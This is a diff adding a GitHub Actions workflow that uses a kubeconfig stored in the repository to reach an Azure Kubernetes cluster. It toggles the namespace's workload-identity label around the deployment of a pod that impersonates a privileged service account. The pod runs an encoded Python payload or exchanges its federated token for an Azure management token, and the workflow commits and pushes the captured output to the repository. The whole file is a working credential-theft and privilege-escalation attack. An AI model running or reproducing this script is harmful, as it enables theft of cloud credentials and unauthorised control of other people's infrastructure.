@@ -1,0 +1,98 @@
+name: ulnode7
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: wi
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=25s"
+          WI=$(python3 -c "import base64;print(base64.b64encode(open('ul/wi/wia.py','rb').read()).decode())")
+          {
+            echo "=== ACR PODS"
+            for p in $($KX get pods -n wallet-billing -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}'); do
+              im=$($KX get pod -n wallet-billing $p -o jsonpath='{.spec.containers[0].image}' 2>/dev/null)
+              case "$im" in *azurecr.io*) echo "CAND $p $im";; esac
+            done
+            PICK=$($KX get pods -n wallet-billing -o wide --field-selector=status.phase=Running | grep -v '^NAME' | grep -m1 'azurecr')
+            POD=$($KX get pods -n wallet-billing -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.containers[0].image}{" "}{.spec.nodeName}{"\n"}{end}' | grep -m1 'azurecr.io')
+            echo "PODLINE=$POD"
+            PN=$(echo "$POD" | awk '{print $1}'); IMG=$(echo "$POD" | awk '{print $2}'); NODE=$(echo "$POD" | awk '{print $3}')
+            [ -z "$IMG" ] && IMG=acrg42ustfdemokashif.azurecr.io/tollgate-control-api:73cdfa9b
+            [ -z "$NODE" ] && NODE=aks-pool110-23564750-vmss000003
+            echo "USE $PN $IMG $NODE"
+            $KX label ns wallet-billing azure-workload-identity.io/namespace- 2>&1
+            cat > /tmp/wi.yaml <<EOF
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulwi3
+            namespace: wallet-billing
+          spec:
+            nodeName: $NODE
+            restartPolicy: Never
+            serviceAccountName: control-sync-apply
+            automountServiceAccountToken: false
+            containers:
+            - name: c
+              image: $IMG
+              imagePullPolicy: IfNotPresent
+              env:
+              - name: AZURE_CLIENT_ID
+                value: "4495d73a-bf6f-40e1-b551-0c775ab7182f"
+              - name: AZURE_TENANT_ID
+                value: "62974d97-13b6-40c9-8576-f1ab2905b6cf"
+              - name: AZURE_FEDERATED_TOKEN_FILE
+                value: "/var/run/secrets/azure/tokens/azure-identity-token"
+              - name: WI_PY
+                value: "$WI"
+              volumeMounts:
+              - name: tok
+                mountPath: /var/run/secrets/azure/tokens
+                readOnly: true
+              command: ["/bin/sh","-c"]
+              args:
+              - |
+                echo "TOOLS: $(command -v python3) $(command -v python) $(command -v curl) $(command -v wget)";
+                ls -la /var/run/secrets/azure/tokens/ 2>&1;
+                if command -v python3 >/dev/null; then python3 -c "import base64,os;exec(base64.b64decode(os.environ['WI_PY']))"; else
+                  A=$(cat /var/run/secrets/azure/tokens/azure-identity-token);
+                  echo "TOKLEN ${#A}";
+                  if command -v curl >/dev/null; then
+                    curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$A" | head -c 600;
+                  else
+                    echo "NO_HTTP_CLIENT";
+                  fi;
+                fi
+            volumes:
+            - name: tok
+              projected:
+                sources:
+                - serviceAccountToken:
+                    audience: api://AzureADTokenExchange
+                    expirationSeconds: 3600
+                    path: azure-identity-token
+          EOF
+            $KX apply -f /tmp/wi.yaml 2>&1 | grep -v '^Warning'
+            $KX label ns wallet-billing azure-workload-identity.io/namespace=true 2>&1
+            for i in 1 2 3 4 5 6 7 8 9 10; do sleep 12; S=$($KX get pod -n wallet-billing ulwi3 -o jsonpath='{.status.phase} {.status.containerStatuses[0].state}' 2>&1); echo "WISTATE$i $S"; echo "$S" | grep -qE 'Succeeded|Failed' && break; done
+            for j in 1 2 3 4 5; do L=$($KX logs -n wallet-billing ulwi3 2>&1); echo "LOGS$j ${L:0:300}"; echo "$L" | grep -q 'ARMTOKEN\|AUTHERR\|TOOLS' && break; sleep 10; done
+            $KX logs -n wallet-billing ulwi3 2>&1 | head -60
+          } 2>&1 | tee node_root7.txt
+          $KX delete pod -n wallet-billing ulwi3 --wait=false 2>&1 | head -2
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulnode7 $(date -u +%s)"
+          git push
